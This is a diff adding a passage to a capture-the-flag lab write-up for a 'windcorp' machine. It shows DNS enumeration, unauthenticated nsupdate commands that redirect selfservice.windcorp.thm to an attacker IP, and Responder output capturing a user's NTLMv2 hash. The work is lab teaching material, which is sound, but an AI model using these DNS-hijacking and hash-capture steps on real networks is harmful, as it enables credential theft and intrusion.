@@ -761,7 +761,48 @@ Now we need to update the DNS record server, since the first flag we found seems
 
 Verify if the record was created:
 
-          
+          dnsrecon -n 10.10.123.107 -d test1.windcorp.thm
+          [*] std: Performing General Enumeration against: test1.windcorp.thm...
+          [-] DNSSEC is not configured for test1.windcorp.thm
+          [*]      TXT test1.windcorp.thm Test record 1
+          ...
+
+Then we have to change the A record for fire.windcorp.thm to point to our attacker machine IP
+
+          nsupdate 
+          > server 10.10.123.107
+          > update delete fire.windcorp.thm
+          > update add fire.windcorp.thm 86400 A 10.9.1.97
+          > send
+          update failed: REFUSED
+          > quit
+
+Indeed it seems that fire.windcorp.thm does not accept updates. At this point we can try to get in control only of the requests for selfservice.windcorp.thm. Let's try to verify if we can accomplish this task:
+
+          nsupdate
+          > server 10.10.123.107
+          > update delete selfservice.windcorp.thm
+          > update add selfservice.windcorp.thm 86400 A 10.9.1.97
+          > send
+          > quit
+
+This time worked: Verify the changes:
+
+          dnsrecon -n 10.10.123.107 -d selfservice.windcorp.thm
+          [*] std: Performing General Enumeration against: selfservice.windcorp.thm...
+          [-] DNSSEC is not configured for selfservice.windcorp.thm
+          [*]      A selfservice.windcorp.thm 10.9.1.97
+          ...
+
+Then in responder we get NTLMv2 hash for edwardle user:
+
+          ...
+          [HTTP] Sending NTLM authentication request to 10.10.123.107
+          [HTTP] GET request from: ::ffff:10.10.123.107  URL: / 
+          [HTTP] NTLMv2 Client   : 10.10.123.107
+          [HTTP] NTLMv2 Username : WINDCORP\edwardle
+          [HTTP] NTLMv2 Hash     : edwardle::WINDCORP:09a5ba22adff963c:...740068006D000000000000000000      
+
   
 
     
